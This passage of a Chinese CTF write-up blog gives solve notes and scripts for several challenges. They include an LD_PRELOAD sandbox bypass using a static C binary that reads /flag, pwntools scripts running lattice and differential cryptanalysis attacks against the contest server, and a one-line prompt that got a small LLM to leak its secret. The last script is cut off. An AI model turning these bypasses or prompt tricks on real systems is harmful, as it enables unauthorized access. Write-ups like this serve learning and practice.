class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Th siz of th fil may reduc after XZRJification</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check_equals</span>(<span class=\"params\">left, right</span>):</span><br><span class=\"line\">    <span class=\"comment\"># check whether left == right or not</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> left != right: <span class=\"keyword\">raise</span> ValueError</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_code_dict</span>():</span><br><span class=\"line\">    <span class=\"comment\"># prepar th cod dict</span></span><br><span class=\"line\">    code_dict = []</span><br><span class=\"line\">    code_dict += [<span class=\"string\">&#x27;nymeh1niwemflcir&#125;echaet0&#x27;</span>]   <span class=\"comment\"># 0-23</span></span><br><span class=\"line\">    code_dict += [<span class=\"string\">&#x27;a3g7&#125;kidgojernoetlsup?h0&#x27;</span>]   <span class=\"comment\"># 24-47</span></span><br><span class=\"line\">    code_dict += [<span class=\"string\">&#x27;uulw!f5soadrhwnrsnstnoeq&#x27;</span>]   <span class=\"comment\"># 48-71</span></span><br><span class=\"line\">    code_dict += [<span class=\"string\">&#x27;ct.&#123;l-findiehaai&#123;oveatas&#x27;</span>]   <span class=\"comment\"># 72-95</span></span><br><span class=\"line\">    code_dict += [<span class=\"string\">&#x27;ty9kxborszst.guyd?!blm-p&#x27;</span>]   <span class=\"comment\"># 96-119</span></span><br><span class=\"line\">    <span class=\"comment\"># print(len(code_dict[0]))</span></span><br><span class=\"line\">    <span class=\"comment\"># print(set(len(s) for s in code_dict))</span></span><br><span class=\"line\">    check_equals(<span class=\"built_in\">set</span>(<span class=\"built_in\">len</span>(s) <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> code_dict), &#123;<span class=\"number\">24</span>&#125;)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;</span>.join(code_dict)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decrypt_data</span>(<span class=\"params\">input_codes</span>):</span><br><span class=\"line\">    <span class=\"comment\"># retriev th decrypted data</span></span><br><span class=\"line\">    code_dict = get_code_dict()</span><br><span class=\"line\">    output_chars = [code_dict[c] <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> input_codes]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;</span>.join(output_chars)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># check som obvious things</span></span><br><span class=\"line\">    check_equals(<span class=\"string\">&#x27;creat&#x27;</span>, <span class=\"string\">&#x27;cre&#x27;</span> + <span class=\"string\">&#x27;at&#x27;</span>)</span><br><span class=\"line\">    check_equals(<span class=\"string\">&#x27;referrer&#x27;</span>, <span class=\"string\">&#x27;refer&#x27;</span> + <span class=\"string\">&#x27;rer&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># check th flag</span></span><br><span class=\"line\">    flag = decrypt_data([<span class=\"number\">53</span>, <span class=\"number\">41</span>, <span class=\"number\">85</span>, <span class=\"number\">109</span>, <span class=\"number\">75</span>, <span class=\"number\">1</span>, <span class=\"number\">33</span>, <span class=\"number\">48</span>, <span class=\"number\">77</span>, <span class=\"number\">90</span>,</span><br><span class=\"line\">                         <span class=\"number\">17</span>, <span class=\"number\">118</span>, <span class=\"number\">36</span>, <span class=\"number\">25</span>, <span class=\"number\">13</span>, <span class=\"number\">89</span>, <span class=\"number\">90</span>, <span class=\"number\">3</span>, <span class=\"number\">63</span>, <span class=\"number\">25</span>,</span><br><span class=\"line\">                         <span class=\"number\">31</span>, <span class=\"number\">77</span>, <span class=\"number\">27</span>, <span class=\"number\">60</span>, <span class=\"number\">3</span>, <span class=\"number\">118</span>, <span class=\"number\">24</span>, <span class=\"number\">62</span>, <span class=\"number\">54</span>, <span class=\"number\">61</span>,</span><br><span class=\"line\">                         <span class=\"number\">25</span>, <span class=\"number\">63</span>, <span class=\"number\">77</span>, <span class=\"number\">36</span>, <span class=\"number\">5</span>, <span class=\"number\">32</span>, <span class=\"number\">60</span>, <span class=\"number\">67</span>, <span class=\"number\">113</span>, <span class=\"number\">28</span>])</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\">    check_equals(flag.index(<span class=\"string\">&#x27;flag&#123;&#x27;</span>), <span class=\"number\">0</span>)</span><br><span class=\"line\">    check_equals(flag.index(<span class=\"string\">&#x27;&#125;&#x27;</span>), <span class=\"built_in\">len</span>(flag) - <span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"comment\"># print th flag</span></span><br><span class=\"line\">    <span class=\"comment\"># print(flag)</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"高频率星球\"><a href=\"#高频率星球\" class=\"headerlink\" title=\"高频率星球\"></a>高频率星球</h2><p>发现原来不装 asciinema 也能玩，一点点用 Ctrl + H 把 ANSI 转义字符删掉就行了。</p>\n<h2 id=\"小型大语言模型星球\"><a href=\"#小型大语言模型星球\" class=\"headerlink\" title=\"小型大语言模型星球\"></a>小型大语言模型星球</h2><p>第一问直接问 <code>Am I smart?</code> 就能套出话来了。<br>第二问已经重装系统了，本地模型都跑不起来，就懒得爆了。</p>\n<h2 id=\"低带宽星球\"><a href=\"#低带宽星球\" class=\"headerlink\" title=\"低带宽星球\"></a>低带宽星球</h2><p>第一问随便压缩一下就行。<br>第二问应该是要手造了，懒得造了。</p>\n<h2 id=\"为什么要打开-flag-😡\"><a href=\"#为什么要打开-flag-😡\" class=\"headerlink\" title=\"为什么要打开 /flag 😡\"></a>为什么要打开 /flag 😡</h2><p>第一问还是 GPT 给出的：</p>\n<blockquote>\n<p>绕过 LD_PRELOAD 注入的共享对象可以比较困难，因为这是一种强大的机制，它允许开发者或系统管理员在运行时更改动态链接的行为。在安全相关的场景或者 Capture The Flag (CTF) 类型的比赛中，绕过这样的限制通常需要一些创造性的方法和对系统工作方式的深刻理解。<br>在给定的上下文中，LD_PRELOAD 用于注入一个共享库（lib.so），这个共享库通过各种方法拦截和更改了文件操作、执行新程序的系统调用。以下是一些可能的绕过策略：<br>    1. 使用静态链接的二进制：<br>    如果可行的话，使用一个静态链接的二进制文件可以避免 LD_PRELOAD 的影响，因为静态链接的程序不会使用动态链接库。<br>    …</p>\n</blockquote>\n<p>想静态编译的话在编译的时候加个 <code>-static</code> 就行了。程序也是 GPT 写的：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    FILE *file;</span><br><span class=\"line\">    <span class=\"type\">char</span> *line = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> len = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">ssize_t</span> read;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 打开 /flag 文件</span></span><br><span class=\"line\">    file = fopen(<span class=\"string\">&quot;/flag&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">        perror(<span class=\"string\">&quot;无法打开文件 /flag&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 读取并打印 /flag 文件的内容</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((read = getline(&amp;line, &amp;len, file)) != <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s&quot;</span>, line);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 释放资源并关闭文件</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(line);</span><br><span class=\"line\">    fclose(file);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> EXIT_SUCCESS;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"黑客马拉松\"><a href=\"#黑客马拉松\" class=\"headerlink\" title=\"黑客马拉松\"></a>黑客马拉松</h2><p>做的时候就感觉铁定非预期了，但是令人迷惑的是这才是最自然的思路，那非预期是不是算预期呢（）。<br>说起来还是第二问给我的解题思路，看第一问看了半天发现第二问更简单，分数也是第二问更低，说明出题人是知道的，这样的题目顺序真是居心叵测。<br>第二问直接取 $e = -1 \\mod \\varphi(N)$ 就过了。<br>第一问严格点，还是这么取的话会触发 small loop，因为 $(-1)^2=1$ 嘛，所以取 $e = -3 \\mod \\varphi(N)$ 就行了。<br>两问都是二元 coppersmith 的形式。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sage.<span class=\"built_in\">all</span> <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">&#x27;202.38.93.111&#x27;</span>, <span class=\"number\">20230</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> itertools</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">small_roots</span>(<span class=\"params\">f, bounds, m=<span class=\"number\">1</span>, d=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> d:</span><br><span class=\"line\">        d = f.degree()</span><br><span class=\"line\"> </span><br><span class=\"line\">    R = f.base_ring()</span><br><span class=\"line\">    N = R.cardinality()</span><br><span class=\"line\">    </span><br><span class=\"line\">    f /= f.coefficients().pop(<span class=\"number\">0</span>)</span><br><span class=\"line\">    f = f.change_ring(ZZ)</span><br><span class=\"line\"> </span><br><span class=\"line\">    G = <span class=\"type\">Sequence</span>([], f.parent())</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(m+<span class=\"number\">1</span>):</span><br><span class=\"line\">        base = N**(m-i) * f**i</span><br><span class=\"line\">        <span class=\"keyword\">for</span> shifts <span class=\"keyword\">in</span> itertools.product(<span class=\"built_in\">range</span>(d), repeat=f.nvariables()):</span><br><span class=\"line\">            g = base * prod(<span class=\"built_in\">map</span>(power, f.variables(), shifts))</span><br><span class=\"line\">            G.append(g)</span><br><span class=\"line\"> </span><br><span class=\"line\">    B, monomials = G.coefficient_matrix()</span><br><span class=\"line\">    monomials = vector(monomials)</span><br><span class=\"line\"> </span><br><span class=\"line\">    factors = [monomial(*bounds) <span class=\"keyword\">for</span> monomial <span class=\"keyword\">in</span> monomials]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i, factor <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(factors):</span><br><span class=\"line\">        B.rescale_col(i, factor)</span><br><span class=\"line\"> </span><br><span class=\"line\">    B = B.dense_matrix().LLL()</span><br><span class=\"line\"> </span><br><span class=\"line\">    B = B.change_ring(QQ)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i, factor <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(factors):</span><br><span class=\"line\">        B.rescale_col(i, <span class=\"number\">1</span>/factor)</span><br><span class=\"line\"> </span><br><span class=\"line\">    H = <span class=\"type\">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> <span class=\"built_in\">filter</span>(<span class=\"literal\">None</span>, B*monomials):</span><br><span class=\"line\">        H.append(h)</span><br><span class=\"line\">        I = H.ideal()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> I.dimension() == -<span class=\"number\">1</span>:</span><br><span class=\"line\">            H.pop()</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> I.dimension() == <span class=\"number\">0</span>:</span><br><span class=\"line\">            roots = []</span><br><span class=\"line\">            <span class=\"keyword\">for</span> root <span class=\"keyword\">in</span> I.variety(ring=ZZ):</span><br><span class=\"line\">                root = <span class=\"built_in\">tuple</span>(R(root[var]) <span class=\"keyword\">for</span> var <span class=\"keyword\">in</span> f.variables())</span><br><span class=\"line\">                roots.append(root)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> roots</span><br><span class=\"line\">    <span class=\"keyword\">return</span> []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = <span class=\"number\">20888518302262822708640092467070098180239940282964311580846713529915991035084176547285976560408772270176488335531054066899663135571600859126844374032782889</span></span><br><span class=\"line\">lfp = <span class=\"number\">641940332996671520364775722844731269161</span></span><br><span class=\"line\">q = <span class=\"number\">6214251232316644767865593529639904703813556510242875683726437167720285962376267466666131377504429682587986680767643437843442269652671382746406944152412577</span></span><br><span class=\"line\">lfq = <span class=\"number\">381239571907162860348261198437277761621</span></span><br><span class=\"line\"></span><br><span class=\"line\">phi = (p - <span class=\"number\">1</span>) * (q - <span class=\"number\">1</span>)</span><br><span class=\"line\">e = phi - <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">token = &lt;token&gt;</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;Please input your token:&#x27;</span>, token.encode())</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;p:&#x27;</span>, <span class=\"built_in\">str</span>(p).encode())</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;q:&#x27;</span>, <span class=\"built_in\">str</span>(q).encode())</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;A large prime factor of p-1: &#x27;</span>, <span class=\"built_in\">str</span>(lfp).encode())</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;A large prime factor of q-1: &#x27;</span>, <span class=\"built_in\">str</span>(lfq).encode())</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;e:&#x27;</span>, <span class=\"built_in\">str</span>(e).encode())</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;Choose mission: &#x27;</span>, <span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">bl = <span class=\"built_in\">eval</span>(r.recvline().decode().strip())[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">n = p*q</span><br><span class=\"line\">PR = PolynomialRing(Zmod(n), names=(<span class=\"string\">&#x27;a&#x27;</span>, <span class=\"string\">&#x27;bh&#x27;</span>))</span><br><span class=\"line\">(a, bh) = PR._first_ngens(<span class=\"number\">2</span>)</span><br><span class=\"line\">f = a * (bh * <span class=\"number\">2</span>**<span class=\"number\">928</span> + bl) - <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">sol = small_roots(f, [<span class=\"number\">2</span>**<span class=\"number\">96</span>, <span class=\"number\">2</span>**<span class=\"number\">96</span>], d=<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">_, bh = sol[<span class=\"number\">0</span>]</span><br><span class=\"line\">b = (bh * <span class=\"number\">2</span>**<span class=\"number\">928</span> + bl) % n</span><br><span class=\"line\"><span class=\"built_in\">print</span>(b)</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;Predict PRNG state: &#x27;</span>, <span class=\"built_in\">str</span>(b).encode())</span><br><span class=\"line\">flag = r.recvline().decode().strip()</span><br><span class=\"line\">success(flag)</span><br><span class=\"line\">r.close()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"不可加密的异世界-2\"><a href=\"#不可加密的异世界-2\" class=\"headerlink\" title=\"不可加密的异世界 2\"></a>不可加密的异世界 2</h2><p>关键就是在 GF(257) 里运算后结果还模了 256，所以有一些 256 变成了 0 返回。那么我们看到的 0 就不知道它原来是 0 还是 256 了。<br>观察字符的规律，可以发现 ascii 码的最高位一定为 0，那么就可以用异或制造相差 128 的两轮差分，这时候能还原矩阵的大部分，少部分没还原是因为上面的原因。<br>这时候如果拿到的向量含 0，就可以用次高位来继续拿一组进行修复，因为我们拿到了向量的大部分，所以可以分别假设次高位为 0 和 1，然后和已知向量进行比较，最像的那个就是正确的。<br>这时候基本有一半左右概率还原了，我们可以算一下概率，上面方法出错的可能只会是因为三组向量中有两个 0 同时出现在一个位置或者三 0 合一（极品情况）。对任一元素，三次都不是 0 或者只出一次 0 的概率为 $(\\frac{255}{256})^3 + 3 \\times \\frac{1}{256} \\times (\\frac{255}{256})^2 = \\frac{8388225}{8388608}$，即出现问题的概率为 $\\frac{383}{8388608}$，然而即使出了问题，我们也有一半的概率直接猜对（默认猜 0 原本就是 0），所以单个元素出错概率为 $\\frac{383}{16777216}$，正确概率为 $\\frac{16776833}{16777216}$，那么 128*128=16384 个元素全部正确的概率为 $(\\frac{16776833}{16777216})^{16384}\\approx 0.687957850470333$。<br>当然如果觉得还不够爽可以像我一样再抽一发修正，这样基本很接近 100% 了。<br>第二问直接求个特征向量，第三问再套个 CVP，此时维数比较大，LLL 的结果不够理想，需要用 BKZ。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> sage.<span class=\"built_in\">all</span> <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">&#x27;202.38.93.111&#x27;</span>, <span class=\"number\">22000</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">token = &lt;token&gt;</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;Please input your token:&#x27;</span>, token.encode())</span><br><span class=\"line\"></span><br><span class=\"line\">times = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enc</span>(<span class=\"params\">m</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> times</span><br><span class=\"line\">    times += <span class=\"number\">1</span></span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">b&#x27;&gt;&#x27;</span>, m.encode())</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;you ciphertext : &#x27;</span>)</span><br><span class=\"line\">    cipher = r.readline().decode().strip()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> cipher</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getvec</span>(<span class=\"params\">i, num=<span class=\"string\">&#x27;00&#x27;</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;11&#x27;</span>*i + num + <span class=\"string\">&#x27;11&#x27;</span>*(<span class=\"number\">128</span>-i-<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getzero</span>(<span class=\"params\">vec</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [i <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">128</span>) <span class=\"keyword\">if</span> vec[i] == <span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bit_recover</span>(<span class=\"params\">b1, b2, diff</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (b1 - b2)*<span class=\"built_in\">pow</span>(diff, -<span class=\"number\">1</span>, <span class=\"number\">257</span>) % <span class=\"number\">257</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">vec_recover</span>(<span class=\"params\">v1, v2, diff</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [bit_recover(b1, b2, diff) <span class=\"keyword\">for</span> b1, b2 <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(v1, v2)]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">diff_attack</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    <span class=\"comment\"># suppose xorflag = &#x27;00000000&#x27;</span></span><br><span class=\"line\">    xorflag = <span class=\"number\">0</span></span><br><span class=\"line\">    c00 = <span class=\"built_in\">bytes</span>.fromhex(enc(getvec(idx, <span class=\"string\">&#x27;00&#x27;</span>)))</span><br><span class=\"line\">    c80 = <span class=\"built_in\">bytes</span>.fromhex(enc(getvec(idx, <span class=\"string\">&#x27;80&#x27;</span>)))</span><br><span class=\"line\">    most = vec_recover(c80, c00, <span class=\"number\">0x80</span>)</span><br><span class=\"line\">    zero00 = getzero(c00)</span><br><span class=\"line\">    zero80 = getzero(c80)</span><br><span class=\"line\">    <span class=\"comment\"># if no zero in c00 and c80, then most is correct</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(zero00+zero80) == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> most</span><br><span class=\"line\">    zero0080 = <span class=\"built_in\">list</span>(<span class=\"built_in\">set</span>(zero00) &amp; <span class=\"built_in\">set</span>(zero80))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> zero0080:</span><br><span class=\"line\">        <span class=\"comment\"># remove the zero in zero00 and zero80, they will be patched later</span></span><br><span class=\"line\">        zero00.remove(i)</span><br><span class=\"line\">        zero80.remove(i)</span><br><span class=\"line\">    c40 = <span 